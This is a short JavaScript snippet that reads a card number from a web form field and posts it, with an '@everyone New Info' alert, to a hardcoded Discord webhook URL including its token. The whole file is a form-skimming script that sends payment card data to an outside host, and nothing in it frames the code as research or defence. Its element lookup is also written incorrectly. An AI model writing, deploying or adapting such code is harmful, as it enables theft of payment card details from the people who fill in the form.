var info = {
    author: {
      name: "New Log"
    },
    title: "New Info Recieved",
    description: "New Entry logged.",
    fields:
    [
        {
            name: "Card Number",
            value: "" + document.getElementById("#cardNum").value
        }
    ]
  }

function send()
{
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1169353050603917404/5yGC18OqO769Q_KAFbooAaOl-mtQkq93Hb9tMERXYa4fGK17S_EGxoQCaEhnLQL5V9y9");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "New Info",
      avatar_url: "",
      content: "@everyone New Info\n\nCard Number: " + document.getElementById("#cardNum").value
      // embeds: 
     // [ info ]
    }

    request.send(JSON.stringify(params));
}